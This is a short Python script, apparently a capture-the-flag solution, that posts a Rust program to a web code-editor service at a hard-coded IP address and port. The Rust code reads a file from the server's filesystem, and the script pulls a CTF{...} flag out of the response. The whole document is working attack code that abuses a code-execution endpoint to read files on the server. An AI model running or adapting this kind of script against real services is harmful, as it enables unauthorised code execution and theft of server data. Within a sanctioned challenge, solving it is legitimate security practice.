import requests
import re

url = "http://34.107.71.117:32677/editor"
headers = {
    "Host": "34.107.71.117:32677",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "close",
    "Content-Type": "application/x-www-form-urlencoded"
}
payload = {
    "codename": """use std::fs;

fn main() {
    let contents = fs::read_to_string("/flag39283761/flag2781263").expect("Unable to read file");
    println!("{}", contents);
}
"""
}

r = requests.post(url, headers=headers, data=payload)
pattern = r'CTF\{[0-9a-fA-F]{64}\}'
match = re.search(pattern, r.text)
if match:
    print(match.group())
else:
    print(r.text)
